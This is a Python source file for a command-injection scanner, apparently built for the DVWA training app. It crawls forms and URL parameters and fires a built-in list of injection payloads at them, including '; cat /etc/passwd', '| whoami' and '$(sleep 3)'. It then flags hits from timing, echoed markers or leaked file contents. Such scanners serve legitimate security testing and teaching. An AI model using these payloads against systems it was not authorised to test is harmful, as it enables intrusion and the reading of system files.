import requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import re
import time

class CMDIScanner:
    def __init__(self, url, args, session=None):
        self.url = url
        self.args = args
        self.session = session if session else requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
        })

        if args.proxy:
            self.session.proxies = {'http': args.proxy, 'https': args.proxy}
        if args.cookies and not session:
            for cookie in args.cookies.split(';'):
                if '=' in cookie:
                    key, val = cookie.strip().split('=', 1)
                    self.session.cookies[key] = val

        self.payloads = self.load_payloads()
        self.results = []

    def load_payloads(self):
        payload_file = 'payloads/cmdi.txt'
        try:
            with open(payload_file, 'r') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            return [
                # For DVWA specifically - prefix with valid IP then inject
                "127.0.0.1; ls",
                "127.0.0.1| ls",
                "127.0.0.1&& ls",
                "127.0.0.1& ls",
                "127.0.0.1| whoami",
                "127.0.0.1| cat /etc/passwd",
                "127.0.0.1| id",
                "127.0.0.1; sleep 3",
                "127.0.0.1| sleep 3",
                "127.0.0.1`sleep 3`",
                "127.0.0.1$(sleep 3)",
                "; ls",
                "| ls",
                "|| ls",
                "& ls",
                "&& ls",
                "` ls`",
                "$(ls)",
                "; sleep 3",
                "| sleep 3",
                "`sleep 3`",
                "$(sleep 3)",
                "; cat /etc/passwd",
                "| whoami",
                "| id",
                "| dir",
                "& whoami",
                "& ver",
                "; echo INJECTED",
                "| echo INJECTED",
                "127.0.0.1; echo INJECTED",
                "127.0.0.1| echo INJECTED",
            ]

    def extract_forms_and_params(self, html, base_url):
        soup = BeautifulSoup(html, 'html.parser')
        targets = []

        # Forms
        for form in soup.find_all('form'):
            action = form.get('action', '')
            action = urljoin(base_url, action) if action else base_url
            method = form.get('method', 'get').lower()

            for input_tag in form.find_all(['input', 'textarea']):
                name = input_tag.get('name')
                if name and input_tag.get('type', 'text') not in ['submit', 'button', 'image']:
                    targets.append({
                        'url': action,
                        'param': name,
                        'method': method,
                        'type': 'form'
                    })

        # URL parameters
        parsed = urlparse(base_url)
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    key = param.split('=')[0]
                    targets.append({
                        'url': base_url,
                        'param': key,
                        'method': 'get',
                        'type': 'url_param'
                    })

        # If no targets found, add common DVWA parameters
        if not targets:
            for param in ['ip', 'host', 'hostname', 'target']:
                targets.append({
                    'url': base_url,
                    'param': param,
                    'method': 'get',
                    'type': 'url_param'
                })

        return targets

    def get_user_token(self, url_override=None):
        target = url_override or self.url
        try:
            r = self.session.get(target, timeout=self.args.timeout)
            soup = BeautifulSoup(r.text, 'html.parser')
            token = soup.find('input', {'name': 'user_token'})
            return token.get('value', '') if token else ''
        except:
            return ''

    def test_blind_cmdi(self, url, param, payload, method='get'):
        try:
            start_time = time.time()
            data = {param: payload}

            # Get CSRF token for POST
            if method == 'post':
                token = self.get_user_token(url)
                if token:
                    data['user_token'] = token
                    data['Submit'] = 'Submit'
                response = self.session.post(url, data=data, timeout=self.args.timeout + 5)
            else:
                response = self.session.get(url, params=data, timeout=self.args.timeout + 5)

            elapsed = time.time() - start_time

            # Time-based detection
            if 'sleep' in payload.lower() and elapsed > 2.5:
                return {
                    'url': url,
                    'param': param,
                    'payload': payload,
                    'technique': 'Time-based blind CMDi',
                    'evidence': f'Response time: {elapsed:.2f}s',
                    'confidence': 'High'
                }

            # Echoed output detection
            if 'INJECTED' in payload and 'INJECTED' in response.text:
                return {
                    'url': url,
                    'param': param,
                    'payload': payload,
                    'technique': 'Reflected output CMDi',
                    'evidence': 'Payload echoed in response',
                    'confidence': 'High'
                }

            # /etc/passwd leak
            if 'root:' in response.text and '/bin/bash' in response.text:
                return {
                    'url': url,
                    'param': param,
                    'payload': payload,
                    'technique': 'File read via CMDi',
                    'evidence': '/etc/passwd contents detected',
                    'confidence': 'Critical'
                }

            # id/whoami output
            if 'uid=' in response.text or 'nt authority' in response.text.lower():
                return {
                    'url': url,
                    'param': param,
                    'payload': payload,
                    'technique': 'Command execution',
                    'evidence': 'id/whoami output detected',
                    'confidence': 'Critical'
                }

            # ls output detection
            if 'ls' in payload and any(x in response.text for x in ['config/', 'etc/', 'home/', 'var/', 'www/']):
                return {
                    'url': url,
                    'param': param,
                    'payload': payload,
                    'technique': 'Directory listing via CMDi',
                    'evidence': 'ls command output pattern detected',
                    'confidence': 'High'
                }

        except requests.Timeout:
            if 'sleep' in payload.lower():
                return {
                    'url': url,
                    'param': param,
                    'payload': payload,
                    'technique': 'Time-based blind CMDi (timeout)',
                    'evidence': 'Request timed out',
                    'confidence': 'Medium'
                }
        except Exception:
            pass

        return None

    def test_error_based_cmdi(self, url, param, payload, method='get'):
        try:
            data = {param: payload}

            if method == 'post':
                token = self.get_user_token(url)
                if token:
                    data['user_token'] = token
                response = self.session.post(url, data=data, timeout=self.args.timeout)
            else:
                response = self.session.get(url, params=data, timeout=self.args.timeout)

            error_patterns = [
                r'sh:\s+\w+:\s+not found',
                r'bash:\s+\w+:\s+command not found',
                r'No such file or directory',
                r'Permission denied',
                r'usage:\s+',
                r'Warning:\s+',
                r'Cannot find',
                r'stderr',
                r'stdout'
            ]

            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return {
                        'url': url,
                        'param': param,
                        'payload': payload,
                        'technique': 'Error-based CMDi',
                        'evidence': f'Error message detected: {pattern[:40]}',
                        'confidence': 'Medium'
                    }
        except Exception:
            pass
        return None

    def scan(self):
        print("    [*] Crawling for input vectors...")

        try:
            response = self.session.get(self.url, timeout=self.args.timeout)
        except Exception as e:
            print(f"    [!] Error fetching target: {e}")
            return []

        targets = self.extract_forms_and_params(response.text, self.url)

        if not targets:
            print("    [!] No input vectors found")
            return []

        print(f"    [*] Found {len(targets)} input vectors")
        print(f"    [*] Testing {len(self.payloads)} payloads...")

        for target in targets:
            for payload in self.payloads:
                result = self.test_blind_cmdi(
                    target['url'], target['param'], payload, target['method']
                )
                if result:
                    self.results.append(result)
                    print(f"    [!] CMDi Found! ({result['confidence']}) - {result['technique']}")
                    break  # Found one for this param, move on

                result = self.test_error_based_cmdi(
                    target['url'], target['param'], payload, target['method']
                )
                if result:
                    self.results.append(result)
                    print(f"    [!] CMDi Found! ({result['confidence']}) - {result['technique']}")
                    break

        if not self.results:
            print("    [+] No command injection vulnerabilities detected")

        return self.results